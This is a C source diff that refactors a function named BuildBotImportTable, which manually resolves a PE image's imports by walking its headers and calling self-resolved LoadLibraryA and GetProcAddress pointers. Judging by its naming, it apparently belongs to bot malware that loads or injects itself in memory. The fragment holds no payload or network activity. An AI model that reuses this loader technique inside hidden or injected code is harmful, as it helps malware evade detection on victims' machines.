@@ -55,6 +55,9 @@ static bool BuildBotImportTable()
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
 	PIMAGE_NT_HEADERS header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(imageBase))[dosHeader->e_lfanew];
 
+    #define GETADDR(OFFSET) ((DWORD)imageBase + (DWORD)OFFSET)
+
+
 	HMODULE kernel32 ;
 	PVOID (WINAPI*_pGetProcAddress)(HMODULE,PCHAR) ;
 	PVOID (WINAPI*_pLoadLibraryA)(PCHAR) ;
@@ -72,12 +75,12 @@ static bool BuildBotImportTable()
 	if ( (_pGetProcAddress == NULL) | (_pLoadLibraryA == NULL) )
 		return 0;
 
-	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + directory->VirtualAddress);
+	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)GETADDR(directory->VirtualAddress);
 
 	for ( ; importDesc->Name; importDesc++ )
 	{
 		DWORD *thunkRef, *funcRef;
-		HMODULE handle = (HMODULE)_pLoadLibraryA( (PCHAR)(imageBase + importDesc->Name) );
+		HMODULE handle = (HMODULE)_pLoadLibraryA( (PCHAR)GETADDR(importDesc->Name));
 
 		if( handle == NULL )
 		{
@@ -87,13 +90,13 @@ static bool BuildBotImportTable()
 
 		if (importDesc->OriginalFirstThunk)
 		{
-			thunkRef = (DWORD *)(imageBase + importDesc->OriginalFirstThunk);
-			funcRef = (DWORD *)(imageBase + importDesc->FirstThunk);
+			thunkRef = (PDWORD)GETADDR(importDesc->OriginalFirstThunk);
+			funcRef = (PDWORD)GETADDR(importDesc->FirstThunk);
 		} 
-		else 
+		else
 		{
-			thunkRef = (DWORD *)(imageBase + importDesc->FirstThunk);
-			funcRef = (DWORD *)(imageBase + importDesc->FirstThunk);
+			thunkRef = (DWORD *)GETADDR(importDesc->FirstThunk);
+			funcRef  = (DWORD *)GETADDR(importDesc->FirstThunk);
 		}
 		
 		for (; *thunkRef; thunkRef++, funcRef++)
@@ -106,7 +109,10 @@ static bool BuildBotImportTable()
 			}
 			else
 			{
-				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(imageBase + *thunkRef);
+				DWORD TempAddr = (DWORD)imageBase;
+				TempAddr += *thunkRef;
+
+				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)TempAddr;
 				Addr = (DWORD)_pGetProcAddress( handle, (PCHAR)&thunkData->Name );
 			}
 			if( Addr )
